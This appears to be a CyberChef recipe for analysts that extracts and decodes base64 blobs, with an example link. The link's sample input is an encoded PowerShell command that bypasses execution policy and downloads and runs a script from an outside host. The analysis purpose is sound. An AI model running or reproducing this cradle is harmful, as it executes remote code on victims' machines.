# Extracts base64 blobs from input data, lists the base64 decoded blobs in output


#### Clean Json
[
  { "op": "Regular expression",
    "args": ["User defined", "[a-z0-9\\=\\+\\/]{100,}", true, true, false, false, false, false, "List matches"] },
  { "op": "Fork",
    "args": ["\\n", "\\n", false] },
  { "op": "From Base64",
    "args": ["A-Za-z0-9+/=", true, false] },
  { "op": "Remove null bytes",
    "args": [] }
]


### Chef Format
Regular_expression('User defined','[a-z0-9\\=\\+\\/]{100,}',true,true,false,false,false,false,'List matches')
Fork('\\n','\\n',false)
From_Base64('A-Za-z0-9+/=',true,false)
Remove_null_bytes()


# Link with example data
https://gchq.github.io/CyberChef/#recipe=Regular_expression('User%20defined','%5Ba-z0-9%5C%5C%3D%5C%5C%2B%5C%5C/%5D%7B100,%7D',true,true,false,false,false,false,'List%20matches')Fork('%5C%5Cn','%5C%5Cn',false)From_Base64('A-Za-z0-9%2B/%3D',true,false)Remove_null_bytes()&input=QzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuRVhFIC1ub3AgLWVwIGJ5cGFzcyAtZSBTUUJGQUZnQUlBQW9BRTRBWlFCM0FDMEFUd0JpQUdvQVpRQmpBSFFBSUFCT0FHVUFkQUF1QUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQUNrQUxnQmtBRzhBZHdCdUFHd0Fid0JoQUdRQWN3QjBBSElBYVFCdUFHY0FLQUFuQUdnQWRBQjBBSEFBT2dBdkFDOEFjQUF1QUdVQWN3QjBBRzhBYmdCcEFHNEFaUUF1QUdNQWJ3QnRBQzhBY0FBL0FITUFiUUJpQUNjQUtRQT0K
